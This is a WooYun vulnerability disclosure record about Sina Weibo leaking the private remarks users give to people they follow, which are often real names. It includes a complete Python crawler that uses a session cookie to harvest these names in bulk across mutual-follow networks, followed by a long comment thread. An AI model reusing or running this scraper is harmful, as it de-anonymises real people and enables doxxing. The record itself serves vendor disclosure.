{"id": 46757, "wybug_id": "wooyun-2014-089519", "wybug_title": "如何通过微博在他人不知情的情况下获取其真实姓名（可批量获取）", "wybug_corp": "新浪微博", "wybug_author": "肉肉", "wybug_date": "2014-12-31 16:26", "wybug_open_date": "2015-02-14 16:28", "wybug_type": "账户体系控制不严", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向公众公开  简要描述： 其实我在微博上也说了这个问题，但是被告知任性的产品经理觉得这是业务特性，真的好任性啊有没有，特性就是我玩个微博真实姓名就被泄露了吗？而且不是我自己提交的呀！！！你不经过我同意搜集我的信息也就罢了，你还展示出来，这么任性不怕挨打吗亲。没啥技术含量，但是感觉危害挺大，小伙伴写代码也挺辛苦，就要个8rank吧，忽略也无所谓 详细说明：  发现这个问题很偶然，就是关注别人的时候，当达到一定条件（我觉得这种条件就是有一定量的共同关注，并不需要互相关注，这个一定量也不大。）就会自动显示别人给被关注者的备注（大部分时候是真名呀喂）\n\n（因为flashsky的名字是公开的信息了所以就拿他做演示了）后来有发现，我也不需要关注别人了，只要别人关注我我也能看到\n\n这位同学对不起了啊其实也不是全部都是真实姓名，但是爬了一下，发现爬出真实姓名的概率特别大呀。这里是是程序\n#!/usr/bin/env python#coding:utf-8import urllib,urllib2import re,sysimport cookielibimport json'''1.入口2.爬去一层3.通过第一层的oid构造出第二层的共同关注url4.爬取第二层'''#全局变量##已经爬行过的路径oidlist = set()spiderlist = set()global countcount = 0headers={}headers = {        'Cookie': 这里添加你的cookie这里添加你的cookie哟,        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0',        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language': 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',        'DNT': 1,        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',        'X-Requested-With': 'XMLHttpRequest',        'Referer': 'http://weibo.com/m4njusaka?from=feed&loc=at&nick=%E8%82%89%E8%82%89%E8%A6%81%E5%A5%BD%E5%A5%BD%E5%86%99%E4%BB%A3%E7%A0%81&noscale_head=1'        }def get_name(content):    try:        name = []        name = re.findall('CONFIG\\[\\'onick\\'\\]=\\'(.*?)\\'', content)         return name[0]    except Exception,e:        passdef get_oid(content):    try:        oid =[]        oid = re.findall('CONFIG\\[\\'oid\\'\\]=\\'(.*?)\\'', content)         return oid[0]     except Exception,e:        passdef get_real_name(user):    real_name = []    user['name'] = urllib.quote(user['name'])    postdata = urllib.urlencode({        'uid' : user['oid'],        'objectid' : '',        'f' : 1,        'extra' : '',        'refer_sort' : '',        'refer_flag' : '',        'location' : 'page_100505_home',        'oid' : user['oid'],        'wforce' : 1,        'nogroup' : 'false',        'fnick' : user['name'],        '_t' : 0,    })    url = \"http://weibo.com/aj/f/followed?ajwvr=6&__rnd=1419910508362\"    req = urllib2.Request(                url = url,                data = postdata,                headers =headers            )    result = urllib2.urlopen(req).read()    real_name = re.findall('\"remark\":\"(.*?)\"',result)    if real_name:        return real_name[0]def get_urllist(url):    cj = cookielib.LWPCookieJar()    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))    urllib2.install_opener(opener)    req = urllib2.Request(url, headers=headers)     response = urllib2.urlopen(req)    content = response.read()    url_list = re.findall(r'action-data=\\\\\\\"uid=(.*?)&fnick=(.*?)&.*?\\\\\\\">私信',content)    return url_listdef get_page_sum(url):    '''返回共同关注人页数'''    req = urllib2.Request(url, headers=headers)     response = urllib2.urlopen(req)    content = response.read()    page = re.findall(r'page S_txt1',content)    page_sum = len(page)    return page_sumdef spider(depth, startURL):    i = 0     if depth <= 0:        return 0    else:        url_list = get_urllist(startURL)        if len(url_list) >0:            for url in url_list:                spider_url = \"http://www.weibo.com/p/100505%s/follow?relate=same_follow\" % url[0]                sum_page = get_page_sum(spider_url)                for page in range(1,sum_page):                    spider_url = \"http://www.weibo.com/p/100505%s/follow?relate=same_follow&page=%s\" % (url[0], page)                    target_url = \"http://weibo.com/u/%s\" % url[0]                    if url[0] in oidlist:                        continue                    else:                        spider(depth - 1, spider_url)                        get_user(url[0])                        oidlist.add(url[0])def get_user(oid):    url = \"http://weibo.com/u/%s\" % oid    req = urllib2.Request(url, headers=headers)     response = urllib2.urlopen(req)    content = response.read()    user ={        'name' : get_name(content),        'oid' : get_oid(content),        'real_name' : ''    }    user['real_name'] = get_real_name(user)    print  user['oid'], urllib.unquote(user['name']), json.loads('{\"test\": \"%s\"}' % user['real_name'])['test']def main():    max_depth = 3    '''开始爬行地址'''    startURL = 'http://weibo.com/p/1005053191954357/follow?from=page_100505_profile&wvr=6&mod=modulerel'    spider(max_depth, startURL)main()\n谢谢帮我写代码的小伙伴，元旦请你女票吃蛋糕去(*^__^*)    漏洞证明：  \n\n\n\n还有那个程序扫出来的结果我直接给piaca啦，就不帖这里了，感觉不大好，扫出来结果是基本上都有真实姓名的。如果那个产品经理还那么任性觉得这不是问题你们的名字被人扫出来了不要打我，去打他，我给你们说他是谁。   修复方案：  我也不知道怎么修，就是加强限制吧，或者给个开关让我自己来觉得是否要显示   版权声明：转载请注明来源 肉肉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-01-01 20:19 厂商回复： 感谢关注新浪安全，此问题正在修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-31 16:27 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  前排？目测要火？    \n     2014-12-31 16:28 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  真的好任性    \n     2014-12-31 16:30 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  ........    \n     2014-12-31 16:33 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  肉总要火    \n     2014-12-31 16:35 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:171        | 破晓团队)\t\t \n  前排花生 瓜子。    \n     2014-12-31 16:35 |    \t\tMedea \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:4        | “记住，黑客行为不仅仅是犯罪。这是生存本...)\t\t \n  肉肉就是任性--.    \n     2014-12-31 16:36 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  肉肉是来打卡的    \n     2014-12-31 16:36 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  顶肉肉    \n     2014-12-31 16:39 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @浩天 我还活着    \n     2014-12-31 16:50 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  吃了任性辣条就是这么任性    \n     2014-12-31 16:54 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  挺肉肉    \n     2014-12-31 16:56 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  肉肉牌辣条，吃了就是任性！    \n     2014-12-31 16:56 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  好任性    \n     2014-12-31 16:59 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  肉肉v5    \n     2014-12-31 16:59 |    \t\t命途多舛 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:9        | 找不到漏洞啊！！！！)\t\t \n  我是来看新浪妹子怎么处理的。    \n     2014-12-31 17:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个肉肉是那个肉肉吗？    \n     2014-12-31 17:10 |    \t\t码农 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 爱肉肉~)\t\t \n  肉肉嫁我~    \n     2014-12-31 17:13 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  肉肉有洞就是任性    \n     2014-12-31 17:25 |    \t\tl137 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:8        | 我叫mt)\t\t \n  肉肉有洞就是任性    \n     2014-12-31 17:30 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @wefgod 哪个肉肉？    \n     2014-12-31 17:43 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  肉肉再次调皮    \n     2014-12-31 18:05 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  他跟你什么仇什么怨？    \n     2014-12-31 18:20 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  吾皇万岁万岁万万岁，@新浪微博 8rank都不给的话，好坏好坏的！！！    \n     2014-12-31 18:44 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @码农 核心白帽子都不是，不嫁    \n     2014-12-31 18:58 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  健哥就是任性    \n     2014-12-31 19:12 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  吾皇万岁万岁万万岁，@新浪微博 8rank都不给的话，好坏好坏的！！！    \n     2014-12-31 20:32 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @肉肉 那爱妃也不是核心,能娶么......    \n     2014-12-31 20:54 |    \t\tcf_hb \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:17        | 爱生活，爱安全！)\t\t \n  女神厉害！    \n     2014-12-31 21:07 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  女神厉害！    \n     2014-12-31 21:17 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  打卡    \n     2014-12-31 21:58 |    \t\t雅柏菲卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:234        | 雙魚座聖鬥士雅柏菲卡)\t\t \n  @肉肉 强势关注    \n     2014-12-31 22:06 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  就是写个脚本跑微博名字么    \n     2014-12-31 22:11 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  新浪 OUT    \n     2014-12-31 22:21 |    \t\tT0ne5 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 搬砖真的很累。)\t\t \n  Hello World，来WooYun第一天。    \n     2014-12-31 23:06 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  跨年漏洞演出。    \n     2014-12-31 23:39 |    \t\t你大爷在此 百无禁忌 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | Hello 各位小伙伴们 大家好 我是王尼玛)\t\t \n  女神 跨年 也挖洞啊     \n     2015-01-01 00:02 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  跨年漏洞    \n     2015-01-01 00:06 |    \t\t东方不败 \t\t\t( 普通白帽子  |\t\t\t        Rank:440 漏洞数:66        | 日出东方，唯我不败。)\t\t \n  肉肉姐你太任性了。    \n     2015-01-01 00:10 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  求帮跑跑 王思聪微博 看看老公真实姓名叫啥。    \n     2015-01-01 00:54 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  请给8rank，肉姐任性小心被拉黑。    \n     2015-01-01 01:31 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  别给肉肉打码，让他露    \n     2015-01-01 08:14 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  我是来支持肉肉的    \n     2015-01-01 08:34 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  肉肉女神！！！！！狂拽炫酷叼炸新浪！！！    \n     2015-01-01 18:39 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  我来顶肉肉    \n     2015-01-02 10:06 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  诶，确认了，是要修复的意思咩    \n     2015-01-02 10:41 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  肉肉打他    \n     2015-01-02 11:46 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  @肉肉 渣浪这是自己打自己的脸    \n     2015-01-02 12:06 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  渣浪还是渣浪    \n     2015-01-02 15:47 |    \t\t曾亦信 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 探知新大陆，迷茫中寻求突破自我)\t\t \n  你该要10 就给你8了    \n     2015-01-03 18:45 |    \t\tMr丶Mario \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | Hello World!)\t\t \n  100块都不给我    \n     2015-01-04 09:37 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  8rank都不给我！真抠！    \n     2015-01-04 15:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @肉肉 拍写真的那个……    \n     2015-01-04 15:39 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @wefgod 我没拍过写真诶    \n     2015-01-04 15:48 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @肉肉 发写真的哈哈可以没    \n     2015-01-05 09:02 |    \t\t码农 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 爱肉肉~)\t\t \n  @肉肉 好吧 等我核心！！！！    \n     2015-01-05 19:40 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  肉肉V5    \n     2015-01-21 16:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然写程序了    \n     2015-01-22 22:26 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  qq这个玩意更明显。。    \n     2015-01-29 23:54 |    \t\tphilipjones \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | 漏洞菜鸟飘过，望大神们照顾。)\t\t \n  3乌比，算了，还是等我再努力一把。。。    \n     2015-01-31 21:13 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  肉肉写得一手好代码    \n     2015-02-01 06:05 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @肉肉 你的个性签名怎么跟我的网名一样    \n     2015-02-01 19:24 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  最后那个莫非是王凯轮！！伟大的Helen？！    \n     2015-03-08 19:04 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  其实很多人待在乌云是因为肉肉。    \n     2015-03-13 21:49 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  觉得这个就只是服务特性，算不上漏洞    \n     2015-04-13 18:04 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  肉肉姐，，，其实这个问题还是没修复。。。。。    \n     2015-07-08 14:48 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  最后那个莫非是王凯轮！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}